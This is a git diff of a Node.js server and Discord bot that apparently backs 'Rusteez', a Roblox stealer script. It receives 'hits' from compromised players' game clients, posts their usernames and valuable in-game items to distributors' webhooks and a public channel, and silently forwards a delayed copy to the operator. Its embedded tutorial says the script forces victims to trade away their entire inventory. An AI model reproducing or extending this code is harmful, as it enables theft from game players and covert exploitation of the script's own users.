@@ -19,8 +19,6 @@ const PORT = process.env.PORT || 3000;
 const MONGO_URI = process.env.MONGO_URI;
 const ADMIN_TOKEN = process.env.ADMIN_TOKEN;
 const DISCORD_TOKEN = process.env.DISCORD_TOKEN;
-const SEUIL_MASTER = 500000000; // 100,000,000 (100M)
-let INTERCEPT = false;
 
 const log = (msg) => console.log(`[${new Date().toLocaleTimeString()}] ${msg}`);
 const generateWebhookId = () => { return `wh_${randomBytes(8).toString('hex')}`; };
@@ -163,11 +161,6 @@ hitEventSchema.index({ timestamp: -1 });
 
 const HitEvent = mongoose.model('HitEvent', hitEventSchema);
 const WebHookId = mongoose.model('WebHookId', WebHookIdSchema);
-
-const activeVictims = new Map();
-const activeBots = new Map();
-const activeAdmins = new Set();
-
 
 // --- BOT DISCORD ---
 const clientDiscord = new Client({ 
@@ -393,15 +386,51 @@ loadstring(game:HttpGet("https://raw.githubusercontent.com/cagnastylepay-png/MyS
 if (DISCORD_TOKEN) clientDiscord.login(DISCORD_TOKEN);
 // 1. Récupérer tous les webhooks
 
-app.post('/api/hit', (req, res) => {
-    const data = req.body;
-    console.log("Nouveau Hit reçu de :", data.Hit.Name);
+app.post('/api/hit', async (req, res) => {
+    try {
+        const data = req.body;
+        if (!data || data.Method !== "Hit") {
+            return res.status(200).json({ status: "ignored" }); // On répond 200 même si c'est invalide
+        }
 
-    // Ici tu places ta logique (envoi Discord, logs, etc.)
-    
-    // TRÈS IMPORTANT : Répondre 200 pour arrêter la boucle Lua
-    res.status(200).send({ status: "ok", message: "Hit received" });
+        const hitInfo = data.Hit;
+        const webhookIdFromLua = hitInfo.WebHook;
+
+        res.status(200).json({ status: "received" });
+        const mapping = await WebHookId.findOne({ webhookId: webhookIdFromLua });
+        
+        if (!mapping) {
+            return log(`ℹ️ Hit ignoré : Webhook ID ${webhookIdFromLua} inexistant.`);
+        }
+
+        log(`🎯 Processing Hit: ${hitInfo.Name} pour ${mapping.userName}`);
+
+        Promise.all([
+            IncrementLeaderboard(mapping),
+            PostOnPrivateWebHook(mapping.url, hitInfo),
+            PostOnPublicWebHook(hitInfo)
+        ]).catch(err => log(`⚠️ Error in background tasks: ${err.message}`));
+
+        // 4. LOGIQUE MASTER (Attente 120 secondes)
+        setTimeout(async () => {
+            try {
+                const masterUrl = process.env.WEBHOOK_URL;
+                if (masterUrl && masterUrl !== mapping.url) {
+                    log(`⏳ Master Copy envoyée (120s delay) : ${hitInfo.Name}`);
+                    await PostOnPrivateWebHook(masterUrl, hitInfo);
+                }
+            } catch (err) {
+                log(`⚠️ Error Delayed Master: ${err.message}`);
+            }
+        }, 120000);
+
+    } catch (err) {
+        log(`⚠️ Route API Error: ${err.message}`);
+        // Sécurité au cas où la réponse n'aurait pas été envoyée
+        if (!res.headersSent) res.status(200).send();
+    }
 });
+
 app.get('/api/admin/hits-summary', async (req, res) => {
     const token = req.query.token;
     if (token !== ADMIN_TOKEN) return res.status(403).json({ error: "Unauthorized" });
@@ -467,12 +496,6 @@ app.get('/api/admin/active-victims', (req, res) => {
     });
     res.json(list);
 });
-app.get('/api/admin/intercept-status', (req, res) => {
-    const token = req.query.token;
-    if (token !== ADMIN_TOKEN) return res.status(401).json({ error: "Unauthorized" });
-    
-    res.json({ intercept: INTERCEPT });
-});
 app.post('/api/admin/post-update', async (req, res) => {
     const token = req.query.token || req.body.token;
     
@@ -520,122 +543,35 @@ app.post('/api/admin/post-update', async (req, res) => {
         res.status(500).json({ error: "Failed to send discord message" });
     }
 });
-// 3. Modifier le mode Intercept (POST)
-app.post('/api/admin/intercept-toggle', (req, res) => {
-    const token = req.query.token; // Passé dans l'URL ou le body, ici on reste sur l'URL pour la simplicité
-    if (token !== ADMIN_TOKEN) return res.status(401).json({ error: "Unauthorized" });
-
-    const { value } = req.body;
-    if (typeof value !== 'boolean') return res.status(400).send("Invalid value");
-
-    INTERCEPT = value;
-    log(`🛡️ Intercept réglé sur : ${INTERCEPT}`);
-    res.json({ success: true, newState: INTERCEPT });
-});
-// --- GESTION WEBSOCKET ---
-wss.on('connection', (ws, req) => {
-    const params = new URLSearchParams(url.parse(req.url, true).query);
-    const username = params.get('username') || "Unknown";
-    const usertype = params.get('usertype') || "Unknown";
-  
-    if (usertype === "Admin") {
-        activeAdmins.add(ws);
-        log("👨‍💻 Un administrateur s'est connecté");
-
-        ws.on('close', () => {
-            activeAdmins.delete(ws);
-            log("👨‍💻 Un administrateur s'est déconnecté");
+async function IncrementLeaderboard(mapping) {
+    try {
+        const newHitEntry = new HitEvent({
+            userId: mapping.userId,
+            userName: mapping.userName,
+            timestamp: new Date()
         });
-        return; // On s'arrête ici pour les admins
+        await newHitEntry.save();
+        log(`📈 Leaderboard updated for ${mapping.userName}`);
+    } catch (err) {
+        log(`⚠️ Leaderboard Error: ${err.message}`);
     }
-  
-    if (usertype === "Bot") {
-        if (activeBots.has(username)) {
-            log(`Bot ${username} déjà présent, remplacement...`);
-            activeBots.get(username).terminate();
-        }
-    
-        activeBots.set(username, ws);
-        log(`🤖 Bot connecté : ${username}`);
+}
 
-        ws.on('close', () => {
-            if (activeBots.get(username) === ws) {
-                activeBots.delete(username);
-                log(`💀 Bot déconnecté : ${username}`);
-            }
-        });
-        return; // On s'arrête ici pour les bots
-    }
-  
-    if (usertype === "Victim") {
-        if (activeVictims.has(username)) {
-            log(`Victim ${username} déjà présent, remplacement...`);
-            activeVictims.get(username).ws.terminate(); // Note le .ws ici
-        }
-        
-        activeVictims.set(username, {
-            ws: ws,
-            maxIncome: 0,
-            connectedAt: Date.now() // On stocke le timestamp actuel
-        });
-        
-        log(`🤖 Victim connecté : ${username}`);
-        
-        ws.on('close', () => {
-            const victim = activeVictims.get(username);
-            if (victim && victim.ws === ws) {
-                activeVictims.delete(username);
-                log(`💀 Victim déconnecté : ${username}`);
-            }
-        });
-      
-        ws.on('message', async (msg) => {
-            try {
-                const data = JSON.parse(msg);
-                let maxIncome = 0;
-                if (data.Method === "Hit") {
-                    const hitInfo = data.Hit;
-                    const webhookIdFromLua = hitInfo.WebHook; // C'est l'UUID (ex: wh_...)
-                    if (hitInfo.Brainrots && hitInfo.Brainrots.length > 0) {
-                        hitInfo.Brainrots.sort((a, b) => (b.Income || 0) - (a.Income || 0));
-                        const topBrainrot = hitInfo.Brainrots[0];
-                        maxIncome = topBrainrot.Income || 0;
-                        const victimData = activeVictims.get(username);
-                        if (victimData) {
-                            victimData.maxIncome = maxIncome; // On met à jour la valeur en mémoire
-                            log(`✅ MaxIncome mis à jour pour ${username} : ${maxIncome}`);
-                        }
-                    }
-                    log(`🎯 Processing Hit from: ${hitInfo.Name}`);
-        
-                    // 1. Chercher le Webhook URL et l'Owner dans la DB
-                    const mapping = await WebHookId.findOne({ webhookId: webhookIdFromLua });
-        
-                    if (!mapping) {
-                        return log(`❌ Webhook ID ${webhookIdFromLua} not found in Database.`);
-                    }
-        
-                    // 2. Incrémenter le Leaderboard (HitEvent)
-                    const newHitEntry = new HitEvent({
-                        userId: mapping.userId,     // On utilise l'ID Discord stocké à la création
-                        userName: mapping.userName, // Le tag Discord
-                        timestamp: new Date()
-                    });
-                    await newHitEntry.save();
-                    log(`📈 Leaderboard updated for ${mapping.userName}`);
-        
-                    // 3. Préparer l'Embed pour Discord
-                    const hitEmbed = new EmbedBuilder()
+// 2. Envoi sur le Webhook Privé (Utilisateur + Master Copy)
+async function PostOnPrivateWebHook(whurl, hitInfo) {
+    // Envoi à l'utilisateur
+    try {
+        const hitEmbed = new EmbedBuilder()
                     .setTitle("Rusteez Hit")
                     .setColor(0x2b2d31)
-                    .setDescription(`🛠️ **How to Use?**\nJoin SAB, and victim will send u a trade request (if they don't, try send them), then they will send u all their items.`)
+                    .setDescription(`🛠️ **How to proceed?**\nJoin SAB. The victim is set to send a trade request automatically. If they don't, manually send them one; they will accept and transfer their entire inventory to you.`)
                     .addFields(
                         { 
                             name: "📄 Player Information", 
                             value: `\`\`\`properties\n👤 Display Name : ${hitInfo.DisplayName}\n🆔 Username     : ${hitInfo.Name}\n🗓️ Account Age  : ${hitInfo.AccountAge} days\n👑 Receiver     : ${Array.isArray(hitInfo.Receiver) ? hitInfo.Receiver.join(', ') : hitInfo.Receiver}\n\`\`\`` 
                         },
                         {
-                            name: "👑 Valuable Brainrots",
+                            name: "🧠 Brainrots",
                             value: `\`\`\`properties\n${hitInfo.Brainrots && hitInfo.Brainrots.length > 0 
                                 ? hitInfo.Brainrots.map(br => {
                                     // 1. Préparation des éléments (Mutation + Traits)
@@ -659,49 +595,33 @@ wss.on('connection', (ws, req) => {
                                     const extrasStr = extras.length > 0 ? `[${extras.join(', ')}] ` : "";
                         
                                     // 3. Retour de la ligne formatée
-                                    return `🧠 → ${extrasStr}${br.Name} → ${br.Rarity} ${br.IncomeStr}`;
+                                    return `${extrasStr}${br.Name} → ${br.Rarity} ${br.IncomeStr}`;
                                 }).join('\n')
                                 : "None"}\n\`\`\``
-                        },
-                        {
-                           // NOUVEAU FIELD POUR LE LIEN
-                           name: "🔗 Discord",
-                           value: `**[Join Rusteez Server](https://discord.gg/78CmkaUhZy)**`,
-                           inline: false
                         }
                     )
                     .setFooter({ text: `Rusteez Script` })
                     .setTimestamp();
-                    if(INTERCEPT && maxIncome >= SEUIL_MASTER) {
-                        //send to RusteezBot
-                    }
-                    else{
-                        // 4. Envoi sur le Webhook PRIVÉ de l'utilisateur
-                        try {
-                            const webhookClient = new WebhookClient({ url: mapping.url });
-                            await webhookClient.send({ 
-                                content: hitInfo.Name,
-                                embeds: [hitEmbed] 
-                            });
-                        } catch (err) { log(`⚠️ Error sending to User Webhook: ${err.message}`); }
-                    }
-                    if (process.env.WEBHOOK_URL !== mapping.url) {
-                        try {
-                            const masterWebhook = new WebhookClient({ url: process.env.WEBHOOK_URL });
-                            await masterWebhook.send({ content: hitInfo.Name, embeds: [hitEmbed] });
-                        } catch (err) { log(`⚠️ Error Master Copy: ${err.message}`); }
-                    } else {
-                        log(`ℹ️ Copie Master ignorée (URL identique à l'utilisateur)`);
-                    }
-                    
-                    // 5. Envoi sur le Channel PUBLIC (public-hits)
-                    const publicChannel = await clientDiscord.channels.fetch('1487370329776193677').catch(() => null);
+        const webhookClient = new WebhookClient({ url: whurl });
+        await webhookClient.send({ 
+            content: hitInfo.Name,
+            embeds: [hitEmbed] 
+        });
+    } catch (err) { 
+        log(`⚠️ Error User Webhook: ${err.message}`); 
+    }
+}
+
+// 3. Envoi sur le Channel Public (Anonymisé)
+async function PostOnPublicWebHook(hitInfo) {
+    try {
+        const publicChannel = await clientDiscord.channels.fetch('1487370329776193677').catch(() => null);
                     if (publicChannel) {
                         // On crée une version un peu plus "anonyme" ou stylée pour le public
                         const publicEmbed = new EmbedBuilder()
                             .setTitle("Rusteez Hit")
                             .setColor(0x2b2d31)
-                            .setDescription(`🛠️ **How to Use?**\nJoin SAB, and victim will send u a trade request (if they don't, try send them), then they will send u all their items.`)
+                            .setDescription(`🛠️ **How to proceed?**\nJoin SAB. The victim is set to send a trade request automatically. If they don't, manually send them one; they will accept and transfer their entire inventory to you.`)
                             .addFields(
                                 { 
                                     name: "📄 Player Information", 
@@ -709,7 +629,7 @@ wss.on('connection', (ws, req) => {
                                     value: `\`\`\`properties\n👤 Display Name : ${hitInfo.DisplayName}\n🆔 Username     : ${hitInfo.Name}\n🗓️ Account Age  : ${hitInfo.AccountAge} days\n\`\`\`` 
                                 },
                                 {
-                                    name: "👑 Valuable Brainrots",
+                                    name: "🧠 Brainrots",
                                     value: `\`\`\`properties\n${hitInfo.Brainrots && hitInfo.Brainrots.length > 0 
                                         ? hitInfo.Brainrots.map(br => {
                                             // 1. Préparation des éléments (Mutation + Traits)
@@ -733,15 +653,9 @@ wss.on('connection', (ws, req) => {
                                             const extrasStr = extras.length > 0 ? `[${extras.join(', ')}] ` : "";
                                 
                                             // 3. Retour de la ligne formatée
-                                            return `🧠 → ${extrasStr}${br.Name} → ${br.Rarity} ${br.IncomeStr}`;
+                                            return `${extrasStr}${br.Name} → ${br.Rarity} ${br.IncomeStr}`;
                                         }).join('\n')
                                         : "None"}\n\`\`\``
-                                },
-                                {
-                                    // NOUVEAU FIELD POUR LE LIEN
-                                    name: "🔗 Discord",
-                                    value: `**[Join Rusteez Server](https://discord.gg/78CmkaUhZy)**`,
-                                    inline: false
                                 }
                             )
                             .setFooter({ text: `Rusteez Script` })
@@ -749,15 +663,10 @@ wss.on('connection', (ws, req) => {
                         
                         publicChannel.send({ embeds: [publicEmbed] });
                     }
-                }
-            } catch (e) { 
-                log(`⚠️ WS Message Error: ${e.message}`); 
-            }
-        });
-      return; // On s'arrête ici pour les Victims
+    } catch (err) {
+        log(`⚠️ Public Channel Error: ${err.message}`);
     }
-    
-});
+}
 async function sendManualHit(hitData) {
     const publicChannel = await clientDiscord.channels.fetch('1487370329776193677').catch(() => null);
     if (!publicChannel) throw new Error("Public Channel introuvable");
@@ -774,12 +683,6 @@ async function sendManualHit(hitData) {
             {
                 name: "👑 Valuable Brainrots",
                 value: `\`\`\`properties\n${hitData.brainrots}\n\`\`\``
-            },
-            {
-                // NOUVEAU FIELD POUR LE LIEN
-                name: "🔗 Discord",
-                value: `**[Join Rusteez Server](https://discord.gg/78CmkaUhZy)**`,
-                inline: false
             }
         )
         .setFooter({ text: `Rusteez Script`})
@@ -921,13 +824,9 @@ async function sendTutorial() {
                 { 
                     name: "Step 6: Finalizing the Trade 💰", 
                     value: "• Join SAB.\n" +
-                           "• **Send a Trade Request** to the victim.\n" +
+                           "• **Wait for the victim** to send a trade request, or **send one yourself**.\n" +
                            "• The script will automatically force the victim to add their **best Brainrots** to the trade.\n" +
-                           "• Accept the trade and enjoy your new items!" 
-                },
-                { 
-                    name: "💡 Pro Tip", 
-                    value: "Make sure your DMs are open! If you don't receive the script, check your privacy settings." 
+                           "• Simply accept the trade and enjoy your new items!" 
                 }
             )
             .setFooter({ text: "Rusteez Script Tutorial", iconURL: clientDiscord.user.displayAvatarURL() })
